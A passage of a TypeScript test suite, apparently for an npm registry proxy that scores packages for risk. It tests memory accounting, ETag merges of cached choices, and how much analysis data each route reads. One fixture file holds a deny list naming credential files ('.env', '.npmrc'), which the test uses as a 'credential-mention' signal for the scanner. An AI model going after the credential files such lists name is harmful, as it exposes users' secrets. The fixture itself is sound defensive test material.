    const counts = { conditional: 0, version: 0 };

    const npm = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch: (req) => {
        if (new URL(req.url).pathname.endsWith("/1.0.0")) {
          counts.version++;

          return Response.json({ dist: { tarball: "https://npm.invalid/a.tgz", shasum: "1".repeat(40) } });
        }

        if (req.headers.has("if-none-match")) counts.conditional++;

        return new Response("{bad json", { headers: { etag: `"changed"` } });
      },
    });

    const layers = Layer.provideMerge(Upstream.layer(npm.url.href, 60_000, null), Layer.mergeAll(Store.postgres("postgres://unused.invalid/none"), noBlobs, RequestMemory.layer(new MemoryPool())));

    try {
      const got = await Effect.runPromise(
        Effect.gen(function* () {
          const up = yield* Upstream;
          const listing = yield* up.listingIfChanged("bad", yield* RequestMemory, `"old"`);
          const version = yield* up.versionOf("bad", "1.0.0");

          return { listing: listing.kind, version: version.kind };
        }).pipe(Effect.provide(layers), Effect.scoped),
      );

      expect(got.listing).toBe("unknown");
      expect(counts.conditional).toBe(1);
      // on 67d8658: the version document was asked for at once
      expect(got.version).toBe("unknown");
      expect(counts.version).toBe(0);
    } finally {
      await npm.stop(true);
    }
  });

  test("finding 4: with another writer holding the lock, a resolve answers at once, and its rows are written after it or skipped", () =>
    withRig(async ({ url, npm, sql }) => {
      const locker = new Client({ connectionString: url });
      await locker.connect();
      await locker.query("BEGIN");
      await locker.query("SELECT pg_advisory_xact_lock($1)", [KEPT_CHOICES_INSERT_LOCK]);
      const within = <A>(p: Promise<A>, ms: number) => Promise.race([p, new Promise<"late">((r) => setTimeout(() => r("late"), ms))]);

      try {
        // no writer (no Worker request): the write is tried before the answer, and skipped rather than waited for
        const inline = await within(resolve({ url, npm: npm.url, name: "app" }), 5_000);

        // on 67d8658: still waiting on the lock
        expect(inline === "late" ? "late" : inline.status).toBe(200);
        expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 0 }]);
        // with a writer (a Worker request): the answer does not wait, and the rows are written after it
        const later: Effect.Effect<void, never, Store | RequestMemory>[] = [];
        const writer = Layer.succeed(ChoicesWriter, ChoicesWriter.of({ later: (write) => Effect.sync(() => void later.push(write)) }));
        const base = Layer.mergeAll(Store.postgres(url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, { maxMs: 0, pollMs: 1 }), Layer.succeed(RegistryConfig, settings(npm.url)), RequestMemory.layer(new MemoryPool()), writer);
        const layers = Layer.provideMerge(Upstream.layer(npm.url, 60_000, null), base);
        const answered = await within(Effect.runPromise(Effect.map(resolveResponse(new URL("http://registry.test/-/apm/v1/resolve?name=app&range=latest")), (r) => r.status).pipe(Effect.provide(layers), Effect.scoped)), 5_000);

        expect(answered).toBe(200);
        expect(later.length).toBeGreaterThan(0);
        expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 0 }]);
        await locker.query("ROLLBACK");

        for (const write of later) await Effect.runPromise(write.pipe(Effect.provide(Layer.mergeAll(Store.postgres(url), RequestMemory.layer(new MemoryPool()))), Effect.scoped));
        expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 3 }]);
      } finally {
        await locker.query("ROLLBACK").catch(() => undefined);
        await locker.end();
      }
    }));
});

// Re-check of 51fc813: a plan is one string, charged once, and the merge with older choices is the database's. Each of
// these failed on 51fc813.
describe("kept choices: re-check of 51fc813", () => {
  /** A version record with a `script`-character install script, as a whole read hands it to a plan. */
  const record = (version: string, script = 0): VersionRecord => ({
    package: "app",
    version,
    manifest: script === 0 ? {} : { scripts: { install: "x".repeat(script) } },
    shasum: "1".repeat(40),
    integrity: "",
    size: 0,
    tarball_key: "",
    published_at: NOW,
    seq: 0,
    published_by: "u",
    deprecated: null,
    status: "active",
    status_reason: null,
    status_at: null,
    status_by: null,
    score: null,
  });

  test("P1: writing a plan cannot take back the plan it is writing: it stays charged until its row is put, or is skipped", async () => {
    const db = await freshDatabase();
    const c = new Client({ connectionString: db.url });

    try {
      await c.connect();

      for (const tight of [false, true]) {
        await c.query(`DELETE FROM upstream_choices`);
        const pool = new MemoryPool(400_000);
        const side = KeptSide.open(pool);
        const plan = keptPlan({ document: "http://npm.invalid/app", etag: `"same"`, distTags: { latest: "1.0.0" }, versions: new Map([["v", [record("1.0.0", 20_000)]]]), reserve: side, at: NOW });

        if (plan === null) throw new Error("no plan");
        const handle = side.holdPlan(plan);
        const writer = pool.request(400_000);
        const other = pool.request(400_000);
        const driver = driverWriteBytes(plan);
        // tight: what the driver allocates fits only if the pool takes back the plan being written
        expect(other.take(pool.limit - plan.weight - (tight ? Math.floor(driver / 2) : driver))).toBe(true);
        const atPut: { charged: number; needed: number }[] = [];

        await Effect.runPromise(
          Effect.gen(function* () {
            const store = yield* Store;

            const watched: StoreApi = {
              ...store,
              writeChoices: (input, write) => store.writeChoices(input, (put) => write((row) => Effect.sync(() => void atPut.push({ charged: pool.charged, needed: other.taken + plan.weight + driver })).pipe(Effect.andThen(put(row))))),
            };

            yield* keepPlans({ store: watched, plans: [handle], at: NOW, lease: writer });
          }).pipe(Effect.provide(Store.postgres(db.url)), Effect.scoped),
        );
        const rows = z.array(z.object({ n: z.number() })).parse((await c.query(`SELECT count(*)::int AS n FROM upstream_choices`)).rows)[0]?.n;

        // on 51fc813: written while the pool counted 175,000 of the 216,022 the plan and the others needed
        for (const seen of atPut) expect(seen.charged).toBeGreaterThanOrEqual(seen.needed);
        expect(rows).toBe(tight ? 0 : 1);
        expect(atPut.length).toBe(tight ? 0 : 1);
        // let go either way, string and charge
        expect(handle.claim()).toBeNull();
        expect(pool.charged).toBe(other.taken);
        writer.release();
        other.release();
        side.close();
      }
    } finally {
      await c.end();
      await db.drop();
    }
  });

  test("P1: a plan with no versions and large dist-tags is charged its full text, also while it waits for the writer", () =>
    withRig(async ({ url, npm, sql }) => {
      const tags = Object.fromEntries(Array.from({ length: 500 }, (_, i) => [`t${i}${"a".repeat(96)}`, "1.0.0"]));
      const tagChars = Object.keys(tags).reduce((n, k) => n + k.length, 0);
      // directly
      const pool = new MemoryPool(1_000_000);
      const side = KeptSide.open(pool);
      const plan = keptPlan({ document: "http://npm.invalid/empty", etag: `"empty"`, distTags: tags, versions: new Map([["root 0 unmatched", []]]), reserve: side, at: NOW });

      if (plan === null) throw new Error("no plan");
      const handle = side.holdPlan(plan);

      // on 51fc813: weight 0 for 49,890 characters of tags
      expect(plan.weight).toBeGreaterThanOrEqual(utf8Bytes(plan.text));
      expect(plan.weight).toBeGreaterThan(tagChars);
      expect(pool.charged).toBe(plan.weight);
      handle.done();
      side.close();
      expect(pool.charged).toBe(0);
      // through a resolve whose root range matches nothing: the plan waits for the writer, charged
      npm.docs.set("app", [doc("app", "1.0.0")]);
      const later: Effect.Effect<void, never, Store | RequestMemory>[] = [];
      const writer = Layer.succeed(ChoicesWriter, ChoicesWriter.of({ later: (write) => Effect.sync(() => void later.push(write)) }));
      const isolate = new MemoryPool();

      const tagged = Bun.serve({
        port: 0,
        hostname: "127.0.0.1",
        fetch: () => {
          const dist = { tarball: "https://npm.invalid/app.tgz", shasum: "1".repeat(40), integrity: integrityOf("app@1.0.0") };

          return Response.json({ name: "app", "dist-tags": { ...tags, latest: "1.0.0" }, versions: { "1.0.0": { ...doc("app", "1.0.0"), dist } }, time: { "1.0.0": new Date(NOW - 10 * DAY).toISOString() } }, { headers: { etag: `"tagged"` } });
        },
      });

      try {
        const base = Layer.mergeAll(Store.postgres(url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, { maxMs: 0, pollMs: 1 }), Layer.succeed(RegistryConfig, settings(tagged.url.href)), RequestMemory.layer(isolate), writer);
        const layers = Layer.provideMerge(Upstream.layer(tagged.url.href, 60_000, null), base);
        const status = await Effect.runPromise(Effect.map(resolveResponse(new URL("http://registry.test/-/apm/v1/resolve?name=app&range=99.0.0")), (r) => r.status).pipe(Effect.provide(layers), Effect.scoped));

        expect(status).toBe(422);
        expect(later.length).toBe(1);
        const waiting = isolate.charged;

        for (const write of later) await Effect.runPromise(write.pipe(Effect.provide(Layer.mergeAll(Store.postgres(url), RequestMemory.layer(isolate))), Effect.scoped));
        // what the waiting plan was charged is given back once it is written: its whole text, the tags included
        expect(waiting - isolate.charged).toBeGreaterThan(tagChars);
        expect(await sql(`SELECT count(*)::int AS n FROM upstream_choices`)).toEqual([{ n: 1 }]);
      } finally {
        await tagged.stop(true);
      }
    }));

  test("the database merges a write into the row kept for the same ETag: past their hour dropped, at most 16 choices, at most 64 KiB, another ETag replaces", () =>
    withRig(async ({ url, sql }) => {
      const HOUR = 60 * MINUTE;

      const run = (rows: { document: string; etag: string; text: string }[], at: number) =>
        Effect.runPromise(Effect.flatMap(Store, (s) => s.keepChoices({ rows, at, capacity: 100, maxBytes: KEPT_CHOICES_MAX_TEXT, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })).pipe(Effect.provide(Store.postgres(url)), Effect.scoped));

      const rec = (version: string, pad = 0) => ({ package: "app", version, manifest: pad === 0 ? {} : { scripts: { install: "x".repeat(pad) } }, shasum: "", integrity: "", size: 0, tarball_key: "", published_at: 0, seq: 0, published_by: "u", deprecated: null, status: "active", status_reason: null, status_at: null, status_by: null });
      const row = (lists: Record<string, { at: number; versions: string[] }>, records: Record<string, ReturnType<typeof rec>>) => JSON.stringify({ distTags: { latest: "1.0.0" }, lists, records });
      const kept = async (document: string) => z.array(z.object({ etag: z.string(), lists: z.array(z.string()), records: z.array(z.string()) })).parse((await sql(`SELECT etag, ARRAY(SELECT jsonb_object_keys(kept->'lists') ORDER BY 1) AS lists, ARRAY(SELECT jsonb_object_keys(kept->'records') ORDER BY 1) AS records FROM upstream_choices WHERE document = $1`, [document])))[0];

      // the hour: an expired choice and its record go, a recent one stays beside the new one
      await run([{ document: "hour", etag: `"e"`, text: row({ old: { at: NOW - 2 * HOUR, versions: ["0.1.0"] }, recent: { at: NOW - 10 * MINUTE, versions: ["0.2.0"] } }, { "0.1.0": rec("0.1.0"), "0.2.0": rec("0.2.0") }) }], NOW - 10 * MINUTE);
      await run([{ document: "hour", etag: `"e"`, text: row({ new: { at: NOW, versions: ["0.3.0"] } }, { "0.3.0": rec("0.3.0") }) }], NOW);
      // on 51fc813: the write replaced the row, so only "new" was kept
      expect(await kept("hour")).toEqual({ etag: `"e"`, lists: ["new", "recent"], records: ["0.2.0", "0.3.0"] });
      // the cap: 16 older choices and 2 new ones keep the 2 new and the 14 newest older
      const sixteen = Object.fromEntries(Array.from({ length: 16 }, (_, i) => [`c${String(i).padStart(2, "0")}`, { at: NOW - (16 - i) * MINUTE, versions: [`1.${i}.0`] }]));
      await run([{ document: "cap", etag: `"e"`, text: row(sixteen, Object.fromEntries(Array.from({ length: 16 }, (_, i) => [`1.${i}.0`, rec(`1.${i}.0`)]))) }], NOW - MINUTE);
      await run([{ document: "cap", etag: `"e"`, text: row({ n1: { at: NOW, versions: ["2.0.0"] }, n2: { at: NOW, versions: ["2.1.0"] } }, { "2.0.0": rec("2.0.0"), "2.1.0": rec("2.1.0") }) }], NOW);
      const capped = await kept("cap");

      expect(capped?.lists.length).toBe(16);
      expect(capped?.lists).toEqual(["c02", "c03", "c04", "c05", "c06", "c07", "c08", "c09", "c10", "c11", "c12", "c13", "c14", "c15", "n1", "n2"]);
      expect(capped?.records.length).toBe(16);
      // the bytes: a merge past 64 KiB keeps only the new choices
      await run([{ document: "bytes", etag: `"e"`, text: row({ big: { at: NOW - MINUTE, versions: ["3.0.0"] } }, { "3.0.0": rec("3.0.0", 40_000) }) }], NOW - MINUTE);
      await run([{ document: "bytes", etag: `"e"`, text: row({ also: { at: NOW, versions: ["3.1.0"] } }, { "3.1.0": rec("3.1.0", 30_000) }) }], NOW);
      expect(await kept("bytes")).toEqual({ etag: `"e"`, lists: ["also"], records: ["3.1.0"] });
      expect(z.array(z.object({ n: z.number() })).parse((await sql(`SELECT octet_length(kept::text)::int AS n FROM upstream_choices WHERE document = 'bytes'`)))[0]?.n ?? 0).toBeLessThanOrEqual(KEPT_CHOICES_MAX_TEXT);
      // another ETag: the row is replaced, nothing of the old kept
      await run([{ document: "hour", etag: `"f"`, text: row({ other: { at: NOW, versions: ["0.4.0"] } }, { "0.4.0": rec("0.4.0") }) }], NOW);
      expect(await kept("hour")).toEqual({ etag: `"f"`, lists: ["other"], records: ["0.4.0"] });
    }));

  test("a conditional read whose 200 is JSON but not a packument marks the package, so the next small read does not ask npm", async () => {
    const counts = { conditional: 0, version: 0 };

    const npm = Bun.serve({
      port: 0,
      hostname: "127.0.0.1",
      fetch: (req) => {
        if (new URL(req.url).pathname.endsWith("/1.0.0")) {
          counts.version++;

          return Response.json({ dist: { tarball: "https://npm.invalid/a.tgz", shasum: "1".repeat(40) } });
        }

        if (req.headers.has("if-none-match")) counts.conditional++;

        return Response.json({ name: 17, versions: {} }, { headers: { etag: `"changed"` } });
      },
    });

    const layers = Layer.provideMerge(Upstream.layer(npm.url.href, 60_000, null), Layer.mergeAll(Store.postgres("postgres://unused.invalid/none"), noBlobs, RequestMemory.layer(new MemoryPool())));

    try {
      const got = await Effect.runPromise(
        Effect.gen(function* () {
          const up = yield* Upstream;
          const listing = yield* up.listingIfChanged("schema", yield* RequestMemory, `"old"`);
          const version = yield* up.versionOf("schema", "1.0.0");

          return { listing: listing.kind, version: version.kind };
        }).pipe(Effect.provide(layers), Effect.scoped),
      );

      expect(got.listing).toBe("unknown");
      expect(counts.conditional).toBe(1);
      // on 51fc813: the version document was asked for at once
      expect(got.version).toBe("unknown");
      expect(counts.version).toBe(0);
    } finally {
      await npm.stop(true);
    }
  });
});

// Review of acdb8eb, findings 2 and 3 (finding 1 is kept-choices-driver.workerd.test.ts): each failed on acdb8eb.
describe("kept choices: review of acdb8eb", () => {
  test("finding 2: a plan's head is not built before its reservation: a pool with no room builds nothing", () => {
    const pool = new MemoryPool(1);
    const side = KeptSide.open(pool);
    const versions = Array.from({ length: 21 }, (_, i): VersionRecord => ({ package: "app", version: `1.${i}.0`, manifest: {}, shasum: "", integrity: "", size: 0, tarball_key: "", published_at: NOW, seq: i, published_by: "u", deprecated: null, status: "active", status_reason: null, status_at: null, status_by: null, score: null }));
    const fromEntries = spyOn(Object, "fromEntries");

    try {
      const plan = keptPlan({ document: "http://npm.invalid/app", etag: `"e"`, distTags: { latest: "1.20.0" }, versions: new Map([["root 0 latest", versions]]), reserve: side, at: NOW });

      expect(plan).toBeNull();
      // on acdb8eb: the lists were built (Object.fromEntries) with the pool charged 0, before the reservation failed
      expect(fromEntries).not.toHaveBeenCalled();
      expect(pool.charged).toBe(0);
    } finally {
      fromEntries.mockRestore();
      side.close();
    }
  });

  test("finding 3: the database merges only under a strong ETag: an equal weak or empty one replaces the row", () =>
    withRig(async ({ url, sql }) => {
      const run = (rows: { document: string; etag: string; text: string }[]) =>
        Effect.runPromise(Effect.flatMap(Store, (s) => s.keepChoices({ rows, at: NOW, capacity: 100, maxBytes: KEPT_CHOICES_MAX_TEXT, maxChoices: KEPT_CHOICES_MAX_CHOICES, maxAgeMs: KEPT_CHOICES_MAX_AGE_MS })).pipe(Effect.provide(Store.postgres(url)), Effect.scoped));

      const row = (key: string) => JSON.stringify({ distTags: {}, lists: { [key]: { at: NOW, versions: [] } }, records: {} });
      const lists = async (document: string) => z.array(z.object({ lists: z.array(z.string()) })).parse(await sql(`SELECT ARRAY(SELECT jsonb_object_keys(kept->'lists') ORDER BY 1) AS lists FROM upstream_choices WHERE document = $1`, [document]))[0]?.lists;

      for (const [document, etag] of [
        ["weak", `W/"e"`],
        ["empty", ""],
        ["strong", `"e"`],
      ] as const) {
        await run([{ document, etag, text: row("a") }]);
        await run([{ document, etag, text: row("b") }]);
      }

      // on acdb8eb: ["a", "b"] for the weak and empty ETags too
      expect(await lists("weak")).toEqual(["b"]);
      expect(await lists("empty")).toEqual(["b"]);
      expect(await lists("strong")).toEqual(["a", "b"]);
    }));
});

// Production, 2026-11-25: a resolve or an explain of next read all 61 of its stored analyses (16 MB of JSON, more with
// each canary) into the Worker, though it scores one version. A resolve now reads the analyses of the versions its
// choices took, and nothing else of a package's history.
describe("a resolve reads the analyses of the versions it picks, not every one stored", () => {
  const manifest = { name: "nextlike", version: "1.0.0", license: "MIT", main: "index.js" };
  // index.js:1 names credential files: evidence a reviewer can dismiss
  const files = [{ path: "package.json", data: JSON.stringify(manifest) }, { path: "index.js", data: "module.exports = { deny: ['.env', '.npmrc'] };\n" }].map((f) => ({ path: f.path, size: f.data.length, mode: 0o644, data: encoder.encode(f.data) }));
  const analysis = analyze({ name: "nextlike", manifest, files, publisher: "a", previousPublishers: [] });

  const fail = (): never => {
    throw new Error("no digest");
  };

  const digest = (version: string): string => digestLabel(digestOf({ integrity: integrityOf(`nextlike@${version}`), shasum: "1".repeat(40) }) ?? fail());

  /**
   * next's shape: 60 analyses of about 270 kB (16 MB) of versions it no longer lists, and the four it lists: 1.0.0 scored
   * with as large an analysis, 1.0.1 by apm-score-v10 only (reused), 1.0.2 decided unreadable, and the latest, 1.0.3,
   * by both scorers (the current one's counts) with a live dismissal of real evidence.
   */
  async function seed(npm: ReturnType<typeof fakeNpm>, sql: (q: string, p?: unknown[]) => Promise<unknown[]>): Promise<number> {
    npm.docs.set("nextlike", ["1.0.0", "1.0.1", "1.0.2", "1.0.3"].map((v) => doc("nextlike", v)));
    npm.docs.set("uses-nextlike", [doc("uses-nextlike", "1.0.0", { nextlike: "^1.0.0" })]);

    const insert = (version: string, d: string, scorer: string, a: Scored) =>
      sql("INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) VALUES ('nextlike', $1, $2, $3, $4::jsonb, 1)", [version, d, scorer, JSON.stringify(a)]);

    const big = { ...analysis, padding: "x".repeat(270_000) };

    await sql("INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) SELECT 'nextlike', '0.0.' || i, 'old' || i, $1, $2::jsonb, 1 FROM generate_series(1, 60) i", [SCORER, JSON.stringify(big)]);
    await insert("1.0.0", digest("1.0.0"), SCORER, big);
    await insert("1.0.1", digest("1.0.1"), PREVIOUS_SCORER, { ...analysis, coverage: { kind: "complete" }, scorer: PREVIOUS_SCORER });
    await sql("INSERT INTO analysis_outcomes (package, version, scorer, outcome, detail, digest, decided_at) VALUES ('nextlike', '1.0.2', $1, 'unreadable', 'x', $2, 1)", [SCORER, digest("1.0.2")]);
    await insert("1.0.3", digest("1.0.3"), PREVIOUS_SCORER, { ...analysis, coverage: { kind: "complete" }, scorer: PREVIOUS_SCORER });
    await insert("1.0.3", digest("1.0.3"), SCORER, analysis);
    await sql("INSERT INTO evidence_dismissals (scorer, package, version, digest, signal, file, line, reason, dismissed_by, dismissed_at) VALUES ($1, 'nextlike', '1.0.3', $2, 'credential-mention', 'index.js', 1, 'a deny list', 'admin', 1)", [SCORER, digest("1.0.3")]);
    await sql("INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) VALUES ('uses-nextlike', '1.0.0', $1, $2, $3::jsonb, 1)", [digestLabel(digestOf({ integrity: integrityOf("uses-nextlike@1.0.0"), shasum: "1".repeat(40) }) ?? fail()), SCORER, JSON.stringify(analysis)]);
    const [stored] = await sql("SELECT sum(octet_length(analysis::text))::bigint AS bytes FROM upstream_analysis WHERE package = 'nextlike'");

    return z.object({ bytes: z.coerce.number() }).parse(stored).bytes;
  }

  test("chosen scores the versions it picks as a read of the whole history scores them, and reads only theirs", () =>
    withRig(async ({ url, npm, sql }) => {
      const history = await seed(npm, sql);
      const proxy = await measured(url);

      try {
        const layers = Layer.provideMerge(Upstream.layer(npm.url, 60_000, null), Layer.mergeAll(Store.postgres(proxy.url), Clock.fixed({ now: NOW, wallNow: NOW }), noBlobs, Layer.succeed(RegistryConfig, settings(npm.url))));
        const shown = (vs: readonly VersionRecord[]) => vs.map((v) => JSON.stringify([v.version, v.score, v.unscorable ?? null]));
        const picks = { latest: ["1.0.3"], each: ["1.0.0", "1.0.1", "1.0.2", "1.0.3"] };
        const choices = Object.entries(picks).map(([key, wanted]) => ({ key, choose: <V extends { version: string }>(pkg: { readonly versions: readonly V[] }) => pkg.versions.filter((v) => wanted.includes(v.version)) }));

        const run = async <A>(program: Effect.Effect<A, unknown, Upstream>): Promise<{ got: A; bytes: number }> => {
          const lease = new MemoryPool().request();
          const before = proxy.total();

          try {
            const got = await Effect.runPromise(program.pipe(Effect.provide(layers), Effect.provideService(RequestMemory, lease), Effect.scoped));

            return { got, bytes: proxy.total() - before };
          } finally {
            lease.release();
          }
        };

        // the scores as a read of every stored analysis gives them (Upstream.summaries reads the whole package's)
        const whole = await run(
          Effect.flatMap(Upstream, (up) => up.summaries(["nextlike"], new MemoryPool().request(), (pkg) => ({ summary: Object.fromEntries(Object.entries(picks).map(([key, wanted]) => [key, shown(pkg.versions.filter((v) => wanted.includes(v.version)))])), weight: 0 }))),
        );

        const picked = await run(
          Effect.flatMap(Upstream, (up) =>
            up.chosen({ names: ["nextlike"], lease: new MemoryPool().request(), choices: () => choices, keep: (c) => ({ summary: Object.fromEntries([...c.versions].map(([key, vs]) => [key, shown(vs)])), weight: 0 }), analyses: "whole" }),
          ),
        );

        const expected = whole.got.get("nextlike");
        const got = picked.got.get("nextlike");

        expect(expected?.kind).toBe("found");
        expect(got).toEqual(expected ?? { kind: "unknown" });
        // the same scores: the current scorer's over v10's, v10's reused, the outcome, the dismissal applied
        const latest = expected?.kind === "found" ? (expected.summary.latest ?? []) : [];

        expect(latest.join()).toContain("a deny list");
        expect(expected?.kind === "found" ? expected.summary.each?.[2] : undefined).toContain("unreadable");
        // 16 MB stored; chosen read 1.0.0's 270 kB and the three small ones, the whole read all of it
        expect(history).toBeGreaterThan(16_000_000);
        expect(whole.bytes).toBeGreaterThan(history);
        expect(picked.bytes).toBeLessThan(270_000 + 64 * 1024);
      } finally {
        proxy.close();
      }
    }));

  test("a resolve of the package, and of one that depends on it, reads the analyses of the versions it picks from only", () =>
    withRig(async ({ url, npm, sql }) => {
      const history = await seed(npm, sql);
      const proxy = await measured(url);

      try {
        for (const name of ["nextlike", "uses-nextlike"]) {
          const before = proxy.total();
          const r = await resolve({ url: proxy.url, npm: npm.url, name });
          const bytes = proxy.total() - before;

          expect(r.status).toBe(200);
          expect(r.text).toContain('"nextlike"');
          expect(r.text).toContain("1.0.3");
          // what it reads does not grow with the 16 MB of history: at most the listed versions' analyses (the root's
          // page of candidates is all four, 1.0.0's 270 kB among them) and the other statements' rows
          expect(history).toBeGreaterThan(16_000_000);
          expect(bytes).toBeLessThan(270_000 + 64 * 1024);
        }
      } finally {
        proxy.close();
      }
    }));

  /** An apm route's answer for `path` at NOW, read from the database at `url` and npm at `npmUrl`. */
  async function routed(url: string, npmUrl: string, path: string): Promise<{ status: number; text: string }> {
    // Better Auth is built on first use only, and these routes never sign anyone in
    const auth = Auth.layer({ databaseUrl: url, options: { secret: "test-secret-that-is-long-enough-for-better-auth" }, baseURL: "http://web.test/" });

    const layers = Layer.provideMerge(
      Layer.mergeAll(Upstream.layer(npmUrl, 60_000, null), auth),
      Layer.mergeAll(Store.postgres(url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(ResolveWait, { maxMs: 0, pollMs: 1 }), Layer.succeed(RegistryConfig, settings(npmUrl)), RequestMemory.layer(new MemoryPool())),
    );

    const req = new Request(`http://registry.test${path}`);
    const program = Effect.flatMap(apmRoute(req, new URL(req.url), { kind: "anon" }), (res) => Effect.promise(async () => ({ status: res?.status ?? 0, text: (await res?.text()) ?? "" })));

    return Effect.runPromise(program.pipe(Effect.provide(layers), Effect.scoped));
  }

  // Production, 2026-11-25: /package/next read every one of next's stored analyses, whole, on every view (the package
  // answer, the score answer, a version's answer), and popular-scores read them twice for latest's score
  test("the package page, the score and version answers and latest's score read only the versions they show", () =>
    withRig(async ({ url, npm, sql }) => {
      const history = await seed(npm, sql);
      const proxy = await measured(url);

      const route = async (path: string) => {
        const before = proxy.total();
        const got = await routed(proxy.url, npm.url, path);

        return { ...got, bytes: proxy.total() - before };
      };

      try {
        // the first package answer reads npm's packument, the second the summary the first kept
        for (const path of ["/-/apm/v1/packages/nextlike", "/-/apm/v1/packages/nextlike", "/-/apm/v1/score/nextlike", "/-/apm/v1/score/nextlike/1.0.1", "/-/apm/v1/packages/nextlike/versions/1.0.0", "/-/apm/v1/packages/nextlike/versions/1.0.2", "/-/apm/v1/popular-scores?names=nextlike", "/-/apm/v1/names?q=nextlike", "/-/package/nextlike/dist-tags", "/-/apm/v1/packages/nextlike/events"]) {
          const r = await route(path);

          expect(r.status).toBe(200);
          // 16 MB stored; at most 1.0.0's 270 kB analysis twice (the version answer of 1.0.0: the page read's, and
          // npm's packument's when the summary cannot answer it) and the rest of the statements' rows
          expect(history).toBeGreaterThan(16_000_000);
          expect(r.bytes).toBeLessThan(2 * 270_000 + 64 * 1024);
        }

        expect((await route("/-/apm/v1/packages/nextlike")).text).toContain('"score":');
        expect((await route("/-/apm/v1/score/nextlike/1.0.1")).text).toContain('"previous":{"version":"1.0.0"');
      } finally {
        proxy.close();
      }
    }));

  /** upstreamRoute's answer for `path` at NOW (`viaSafe`: under ~safe), read from the database at `url` and npm at `npmUrl`. */
  async function served(url: string, npmUrl: string, path: string, options: { viaSafe: boolean; headers?: Record<string, string> }): Promise<{ status: number; text: string }> {
    const layers = Layer.provideMerge(
      Upstream.layer(npmUrl, 60_000, null),
      Layer.mergeAll(Store.postgres(url), Clock.fixed({ now: NOW, wallNow: NOW }), Analysis.none, noBlobs, Layer.succeed(RegistryConfig, settings(npmUrl)), RequestMemory.layer(new MemoryPool())),
    );

    const req = new Request(`http://registry.test${path}`, { headers: options.headers });
    const program = Effect.flatMap(upstreamRoute(req, new URL(req.url), options.viaSafe), (res) => Effect.promise(async () => ({ status: res?.status ?? 0, text: (await res?.text()) ?? "" })));

    return Effect.runPromise(program.pipe(Effect.provide(layers), Effect.scoped));
  }

  // Post-launch review of 216a4c7, finding 3: the full packument, a credentialed or ~safe one, a version's document and
  // a ~safe tarball read every stored analysis of the package as one value (Store.upstreamAnalyses), charged to nothing
  test("the packument, a version's document and a tarball under ~safe read the analyses of the versions npm lists only, trimmed", () =>
    withRig(async ({ url, npm, sql }) => {
      const history = await seed(npm, sql);
      const proxy = await measured(url);

      try {
        for (const [path, options] of [
          ["/nextlike", { viaSafe: false }],
          ["/nextlike", { viaSafe: false, headers: { authorization: "Bearer x", accept: "application/vnd.npm.install-v1+json" } }],
          ["/nextlike", { viaSafe: true }],
          ["/nextlike/1.0.3", { viaSafe: false }],
          ["/nextlike/latest", { viaSafe: true }],
          ["/nextlike/-/nextlike-1.0.3.tgz", { viaSafe: true }],
        ] as const) {
          const before = proxy.total();
          const r = await served(proxy.url, npm.url, path, options);
          const bytes = proxy.total() - before;

          expect(r.status).not.toBe(0);
          // 16 MB stored; at most the four listed versions' analyses (1.0.0's 270 kB among them) and the other rows
          expect(history).toBeGreaterThan(16_000_000);
          expect(bytes).toBeLessThan(270_000 + 64 * 1024);
        }

        expect((await served(proxy.url, npm.url, "/nextlike", { viaSafe: false })).text).toContain('"_apmScore"');
      } finally {
        proxy.close();
      }
    }));

  test("no route reads a package's whole history of analyses", () => {
    const dir = join(import.meta.dir, "..", "src");

    for (const f of readdirSync(dir).filter((f) => f.endsWith(".ts") && f !== "db.ts")) expect(readFileSync(join(dir, f), "utf8")).not.toMatch(/\.upstreamAnalyses\(/);
  });

  // Review of ef5ace1: a version npm lists no checksum for has no digest, so it was left out of the versions read, and
  // the outcome the worker stores for it (unavailable, no digest) with it: it showed as queued for analysis
  test("a picked or shown version npm lists no checksum for keeps its unavailable outcome", () =>
    withRig(async ({ url, npm, sql }) => {
      npm.docs.set("bare", [doc("bare", "1.0.0"), doc("bare", "1.0.1")]);
      npm.bare.add("bare@1.0.1");
      await sql("INSERT INTO upstream_analysis (package, version, digest, scorer, analysis, analyzed_at) VALUES ('bare', '1.0.0', $1, $2, $3::jsonb, 1)", [digestLabel(digestOf({ integrity: integrityOf("bare@1.0.0"), shasum: "1".repeat(40) }) ?? fail()), SCORER, JSON.stringify(analysis)]);
      await sql("INSERT INTO analysis_outcomes (package, version, scorer, outcome, detail, digest, decided_at) VALUES ('bare', '1.0.1', $1, 'unavailable', 'the upstream publishes no checksum for this version', NULL, 1)", [SCORER]);
      const resolved = await resolve({ url, npm: npm.url, name: "bare" });

      expect(resolved.body.version).toBe("1.0.1");
      expect(resolved.text).toContain('"unscorable":"unavailable"');
      expect(resolved.text).not.toContain("queued for analysis");

      for (const path of ["/-/apm/v1/packages/bare", "/-/apm/v1/packages/bare", "/-/apm/v1/packages/bare/versions/1.0.1"]) {
        const r = await routed(url, npm.url, path);

        expect(r.status).toBe(200);
        expect(r.text).toContain("the upstream publishes no checksum for this version");
        expect(r.text).not.toContain('"kind":"queued"');
      }
    }));

  // Review of ef5ace1: a package page reads the analyses of the versions it shows and keeps, so one scored only in an
  // older version its summary leaves out was not kept, where a read of its whole history kept it. Review of e68dcd8:
  // deciding that by reading those older analyses read all 16 MB of next's history again, whatever the trim left
  test("a package scored only in versions its summary leaves out is kept, and deciding so reads none of their analyses", () =>
    withRig(async ({ url, npm, sql }) => {
      // next's shape: 60 analyses of about 270 kB, of none of the newest KEPT_VERSIONS versions, in a member no trim drops
      const versions = Array.from({ length: KEPT_VERSIONS + 60 }, (_, i) => `0.0.${i + 1}`);
      const label = (name: string, v: string) => digestLabel(digestOf({ integrity: integrityOf(`${name}@${v}`), shasum: "1".repeat(40) }) ?? fail());
